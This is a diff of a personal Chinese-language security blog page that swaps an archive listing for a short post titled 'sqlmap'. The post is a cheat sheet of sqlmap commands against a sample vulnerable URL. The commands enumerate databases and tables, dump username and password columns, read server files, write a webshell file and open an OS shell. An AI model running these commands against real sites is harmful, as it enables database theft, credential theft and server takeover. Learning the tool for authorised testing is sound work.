@@ -79,13 +79,17 @@
 
 
 
-<meta property="og:type" content="website">
-<meta property="og:title" content="bak6ry">
-<meta property="og:url" content="http://yoursite.com/archives/2018/07/index.html">
+<meta name="description" content="获取数据库基本信息 sqlmap -u “http://www.vuln.cn/post.php?id=1&amp;quot;  –dbms mysql –level 3 –dbs 查询有哪些数据库 sqlmap -u “http://www.vuln.cn/post.php?id=1&amp;quot;  –dbms mysql –level 3 -D test –tables 查询test数据库中有哪些表 s">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqlmap">
+<meta property="og:url" content="http://yoursite.com/2018/04/11/mysql操作手册/index.html">
 <meta property="og:site_name" content="bak6ry">
+<meta property="og:description" content="获取数据库基本信息 sqlmap -u “http://www.vuln.cn/post.php?id=1&amp;quot;  –dbms mysql –level 3 –dbs 查询有哪些数据库 sqlmap -u “http://www.vuln.cn/post.php?id=1&amp;quot;  –dbms mysql –level 3 -D test –tables 查询test数据库中有哪些表 s">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2018-08-02T00:52:55.298Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="bak6ry">
+<meta name="twitter:title" content="sqlmap">
+<meta name="twitter:description" content="获取数据库基本信息 sqlmap -u “http://www.vuln.cn/post.php?id=1&amp;quot;  –dbms mysql –level 3 –dbs 查询有哪些数据库 sqlmap -u “http://www.vuln.cn/post.php?id=1&amp;quot;  –dbms mysql –level 3 -D test –tables 查询test数据库中有哪些表 s">
 
 
 
@@ -115,7 +119,7 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/archives/2018/07/"/>
+  <link rel="canonical" href="http://yoursite.com/2018/04/11/mysql操作手册/"/>
 
 
 
@@ -131,7 +135,7 @@
   </script>
 
 
-  <title>归档 | bak6ry</title>
+  <title>sqlmap | bak6ry</title>
   
 
 
@@ -150,7 +154,7 @@
     
   
 
-  <div class="container sidebar-position-left page-archive">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 	<a href="https://github.com/The7sins"  class="github-corner" aria-label="View source on Github"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
 
@@ -245,111 +249,170 @@
           <div id="content" class="content">
             
 
+  <div id="posts" class="posts-expand">
+    
+
+  
+
   
   
   
-  <div class="post-block archive">
-    <div id="posts" class="posts-collapse">
-      <span class="archive-move-on"></span>
-
-      <span class="archive-page-counter">
-        
-        
-        
-          
-        
-        嗯..! 目前共计 8 篇日志。 继续努力。
-      </span>
-
-      
-
-        
-        
-        
-
-        
-          
-          <div class="collection-title">
-            <h1 class="archive-year" id="archive-year-2018">2018</h1>
-          </div>
-        
-        
-
-        
 
   <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/11/mysql操作手册/">
 
-      <h2 class="post-title">
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="bak6ry">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="bak6ry">
+    </span>
+
+    
+      <header class="post-header">
+
         
-            <a class="post-title-link" href="/2018/07/23/巅峰极客/" itemprop="url">
-              
-                <span itemprop="name">巅峰极客2018第一场部分wp</span>
-              
-            </a>
         
-      </h2>
+          <h1 class="post-title" itemprop="name headline">sqlmap</h1>
+        
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2018-07-23T10:49:00+08:00"
-              content="2018-07-23" >
-          07-23
-        </time>
-      </div>
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-11T23:43:10+08:00">
+                2018-04-11
+              </time>
+            
 
-    </header>
-  </article>
+            
 
+            
+          </span>
 
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
 
       
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2018/07/23/sctf2018/" itemprop="url">
-              
-                <span itemprop="name">sctf2018部分wp</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2018-07-23T09:49:00+08:00"
-              content="2018-07-23" >
-          07-23
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
       
 
+      
+        <p>获取数据库基本信息</p>
+<p>sqlmap -u “<a href="http://www.vuln.cn/post.php?id=1&quot;" target="_blank" rel="noopener">http://www.vuln.cn/post.php?id=1&quot;</a>  –dbms mysql –level 3 –dbs</p>
+<p>查询有哪些数据库</p>
+<p>sqlmap -u “<a href="http://www.vuln.cn/post.php?id=1&quot;" target="_blank" rel="noopener">http://www.vuln.cn/post.php?id=1&quot;</a>  –dbms mysql –level 3 -D test –tables</p>
+<p>查询test数据库中有哪些表</p>
+<p>sqlmap -u “<a href="http://www.vuln.cn/post.php?id=1&quot;" target="_blank" rel="noopener">http://www.vuln.cn/post.php?id=1&quot;</a>  –dbms mysql –level 3 -D test -T admin –columns</p>
+<p>查询test数据库中admin表有哪些字段</p>
+<p>sqlmap -u “<a href="http://www.vuln.cn/post.php?id=1&quot;" target="_blank" rel="noopener">http://www.vuln.cn/post.php?id=1&quot;</a>  –dbms mysql –level 3 -D test -T admin -C “username,password” –dump</p>
+<p>dump出字段username与password中的数据</p>
+<p>其他命令参考下面<br>从数据库中搜索字段</p>
+<p>sqlmap -r “c:\tools\request.txt” –dbms mysql -D dedecms –search -C admin,password<br>在dedecms数据库中搜索字段admin或者passwor<br>读取与写入文件</p>
+<p>首先找需要网站的物理路径，其次需要有可写或可读权限。</p>
+<p>–file-read=RFILE 从后端的数据库管理系统文件系统读取文件 （物理路径）<br>–file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件 （mssql xp_shell）<br>–file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径</p>
+<p>#示例：<br>sqlmap -r “c:\request.txt” -p id –dbms mysql –file-dest “e:\php\htdocs\dvwa\inc\include\1.php” –file-write “f:\webshell\1112.php”</p>
+<p>使用shell命令：</p>
+<p>sqlmap -r “c:\tools\request.txt” -p id –dms mysql –os-shell<br>接下来指定网站可写目录：<br>“E:\php\htdocs\dvwa”</p>
+<p>#注：mysql不支持列目录，仅支持读取单个文件。sqlserver可以列目录，不能读写文件，但需要一个（xp_dirtree函数）<br>sqlmap详细命令：</p>
+<pre><code>--is-dba 当前用户权限（是否为root权限）
+--dbs 所有数据库
+--current-db 网站当前数据库
+--users 所有数据库用户
+--current-user 当前数据库用户
+--random-agent 构造随机user-agent
+--passwords 数据库密码
+--proxy http://local:8080 --threads 10 (可以自定义线程加速) 代理
+--time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）
+</code></pre>
+      
     </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/04/11/python/" rel="next" title="python学习">
+                <i class="fa fa-chevron-left"></i> python学习
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/07/23/sctf2018/" rel="prev" title="sctf2018部分wp">
+                sctf2018部分wp <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
   </div>
   
   
   
+  </article>
 
-  
 
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -357,6 +420,10 @@
 
 
           
+
+  
+
+
 
         </div>
         
@@ -569,6 +636,10 @@
   
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
 
   
 
